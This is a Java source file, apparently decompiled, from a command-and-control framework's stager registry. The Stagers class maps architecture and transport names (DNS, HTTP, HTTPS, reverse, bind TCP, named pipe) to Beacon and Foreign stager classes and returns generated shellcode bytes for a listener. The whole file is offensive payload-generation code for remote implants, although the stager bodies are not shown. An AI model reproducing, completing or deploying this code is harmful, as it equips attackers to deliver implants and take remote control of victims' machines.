package stagers;

import common.AssertUtils;
import common.CommonUtils;
import common.ScListener;
import java.util.HashMap;
import java.util.Map;

public class Stagers {
   private static Stagers stagers = new Stagers();
   protected Map x86_stagers = new HashMap();
   protected Map x64_stagers = new HashMap();

   public Stagers() {
      this.add(new BeaconDNSStagerX86((ScListener)null));
      this.add(new BeaconHTTPSStagerX64((ScListener)null));
      this.add(new BeaconHTTPSStagerX86((ScListener)null));
      this.add(new BeaconHTTPStagerX64((ScListener)null));
      this.add(new BeaconHTTPStagerX86((ScListener)null));
      this.add(new ForeignHTTPSStagerX86((ScListener)null));
      this.add(new ForeignHTTPStagerX86((ScListener)null));
      this.add(new ForeignHTTPSStagerX86((ScListener)null));
      this.add(new ForeignHTTPStagerX86((ScListener)null));
      this.add(new ForeignReverseStagerX64((ScListener)null));
      this.add(new ForeignReverseStagerX86((ScListener)null));
   }

   public static byte[] shellcode(ScListener var0, String var1, String var2) {
      GenericStager var3 = stagers.resolve(var0, var1, var2);
      return var3 != null ? var3.generate() : new byte[0];
   }

   public static byte[] shellcodeBindTcp(ScListener var0, int var1, String var2) {
      Object var3;
      if ("x86".equals(var2)) {
         var3 = new BeaconBindStagerX86(var0);
      } else {
         if (!"x64".equals(var2)) {
            throw new RuntimeException("Invalid arch '" + var2 + "'");
         }

         var3 = new BeaconBindStagerX64(var0);
      }

      return ((GenericBindStager)var3).generate(var1);
   }

   public static byte[] shellcodeBindPipe(ScListener var0, String var1, String var2) {
      if ("x86".equals(var2)) {
         return (new BeaconPipeStagerX86(var0)).generate(var1);
      } else if ("x64".equals(var2)) {
         throw new RuntimeException("No x64 option for the bind_pipe stager");
      } else {
         throw new RuntimeException("Invalid arch '" + var2 + "'");
      }
   }

   public GenericStager resolve(ScListener var1, String var2, String var3) {
      Map var4 = null;
      if ("x86".equals(var3)) {
         var4 = this.x86_stagers;
      } else if ("x64".equals(var3)) {
         var4 = this.x64_stagers;
      } else {
         var4 = null;
      }

      if (var4.containsKey(var2)) {
         return ((GenericStager)var4.get(var2)).create(var1);
      } else {
         CommonUtils.print_error("shellcode for " + var1.getName() + " is empty. No stager " + var3 + " stager for " + var2);
         return null;
      }
   }

   public void add(GenericStager var1) {
      if (!AssertUtils.TestArch(var1.arch())) {
         CommonUtils.print_info(var1.getClass().toString());
      }

      if ("x86".equals(var1.arch())) {
         this.x86_stagers.put(var1.payload(), var1);
      } else if ("x64".equals(var1.arch())) {
         this.x64_stagers.put(var1.payload(), var1);
      }

   }
}
